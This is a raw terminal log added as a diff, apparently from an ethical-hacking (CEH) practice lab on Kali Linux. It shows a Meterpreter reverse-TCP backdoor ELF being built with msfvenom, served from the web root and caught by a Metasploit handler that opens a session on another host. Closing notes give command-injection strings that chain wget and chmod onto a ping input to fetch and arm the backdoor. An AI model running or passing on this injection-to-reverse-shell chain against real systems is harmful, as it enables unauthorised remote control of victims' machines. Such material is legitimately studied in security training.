@@ -1,0 +1,354 @@
+root@kali:~/Desktop/CEH# ping -c 3 4.2.2.2
+PING 4.2.2.2 (4.2.2.2) 56(84) bytes of data.
+64 bytes from 4.2.2.2: icmp_seq=1 ttl=54 time=46.4 ms
+64 bytes from 4.2.2.2: icmp_seq=2 ttl=54 time=46.7 ms
+64 bytes from 4.2.2.2: icmp_seq=3 ttl=54 time=46.8 ms
+
+--- 4.2.2.2 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2003ms
+rtt min/avg/max/mdev = 46.425/46.693/46.862/0.191 ms
+root@kali:~/Desktop/CEH# ping -c 3 4.2.2.2 && uname -a && pwd && id
+PING 4.2.2.2 (4.2.2.2) 56(84) bytes of data.
+64 bytes from 4.2.2.2: icmp_seq=1 ttl=54 time=43.6 ms
+64 bytes from 4.2.2.2: icmp_seq=2 ttl=54 time=44.7 ms
+64 bytes from 4.2.2.2: icmp_seq=3 ttl=54 time=43.9 ms
+
+--- 4.2.2.2 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2004ms
+rtt min/avg/max/mdev = 43.676/44.105/44.701/0.434 ms
+Linux kali 4.17.0-kali1-686-pae #1 SMP Debian 4.17.8-1kali1 (2018-07-24) i686 GNU/Linux
+/root/Desktop/CEH
+uid=0(root) gid=0(root) groups=0(root)
+root@kali:~/Desktop/CEH# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST 192.168.1.10 LPORT
+
+^Z
+[1]+  Stopped                 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST 192.168.1.10 LPORT
+root@kali:~/Desktop/CEH# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST 192.168.1.10 LPORT 4457 -f elf /var/www/html/amit_linuxbackdoor.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Error: The following options failed to validate: LHOST, LPORT.
+root@kali:~/Desktop/CEH# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4457 -f elf /var/www/html/amit_linuxbackdoor.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 123 bytes
+Final size of elf file: 207 bytes
+ELFT�44 ���Jj
+^1���SCSj�f��̀�[h��
+hi��jfXPQW��C̀��yNt=h�Xjj��1�̀��y��'������
+                                            ��
+                                              �}̀��x[�ᙶ
+                                                       �̀��x����̀
+root@kali:~/Desktop/CEH# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4457 -f -o elf /var/www/html/amit_linuxbackdoor.elf
+Error: Invalid Format Selected
+root@kali:~/Desktop/CEH# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4457 -f elf -o /var/www/html/amit_linuxbackdoor.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 123 bytes
+Final size of elf file: 207 bytes
+Saved as: /var/www/html/amit_linuxbackdoor.elf
+root@kali:~/Desktop/CEH# service postgresql start
+sroot@kali:~/Desktop/CEH# msfconosle -q
+bash: msfconosle: command not found
+root@kali:~/Desktop/CEH# msfconsole -a
+^Z
+[2]+  Stopped                 msfconsole -a
+root@kali:~/Desktop/CEH# msfconsole -q
+msf > use multi/handler
+msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp 
+payload => linux/x86/meterpreter/reverse_tcp
+msf exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(multi/handler) > set LPORT 4457
+LPORT => 4457
+msf exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4457             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(multi/handler) > set LHOST 192.168.1.10
+LHOST => 192.168.1.10
+msf exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.10     yes       The listen address (an interface may be specified)
+   LPORT  4457             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(multi/handler) > exploit -j 
+[*] Exploit running as background job 0.
+
+[*] Started reverse TCP handler on 192.168.1.10:4457 
+msf exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                            Payload opts
+  --  ----                    -------                            ------------
+  0   Exploit: multi/handler  linux/x86/meterpreter/reverse_tcp  tcp://192.168.1.10:4457
+
+msf exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                            Payload opts
+  --  ----                    -------                            ------------
+  0   Exploit: multi/handler  linux/x86/meterpreter/reverse_tcp  tcp://192.168.1.10:4457
+
+msf exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf exploit(multi/handler) > 
+[*] Sending stage (861480 bytes) to 192.168.1.43
+[*] Meterpreter session 1 opened (192.168.1.10:4457 -> 192.168.1.43:59451) at 2019-08-04 15:48:29 +0530
+
+msf exploit(multi/handler) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information  Connection
+  --  ----  ----                   -----------  ----------
+  1         meterpreter x86/linux               192.168.1.10:4457 -> 192.168.1.43:59451 (192.168.1.43)
+
+msf exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > sysinfo
+[-] Unknown command: sysinfo.
+meterpreter > ?
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Drop into irb scripting mode
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+meterpreter > ls
+[-] Unknown command: ls.
+meterpreter > sessions -i 1
+Usage: sessions <id>
+
+Interact with a different session Id.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+
+meterpreter > sessions
+Usage: sessions <id>
+
+Interact with a different session Id.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+
+meterpreter > ?
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Drop into irb scripting mode
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+meterpreter > ls
+[-] Unknown command: ls.
+meterpreter > dir
+[-] Unknown command: dir.
+meterpreter > sessions
+Usage: sessions <id>
+
+Interact with a different session Id.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+
+meterpreter > getuid
+[-] Unknown command: getuid.
+meterpreter > guid
+[+] Session GUID: 00000000-0000-0000-0000-000000000000
+meterpreter > machine_id
+[-] Error running command machine_id: Rex::TimeoutError Operation timed out.
+meterpreter > 
+[*] 192.168.1.43 - Meterpreter session 1 closed.  Reason: Died
+
+Background session 1? [y/N]  Y
+[-] Unknown command: Y.
+msf exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                            Payload opts
+  --  ----                    -------                            ------------
+  0   Exploit: multi/handler  linux/x86/meterpreter/reverse_tcp  tcp://192.168.1.10:4457
+
+msf exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf exploit(multi/handler) > 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+######################################### 
+
+4.2.2.2 && chmod +x amit_linuxbackdoor.elf
+4.2.2.2 && wget 192.168.1.10/amit_linuxbackdoor.elf && ls -l
+
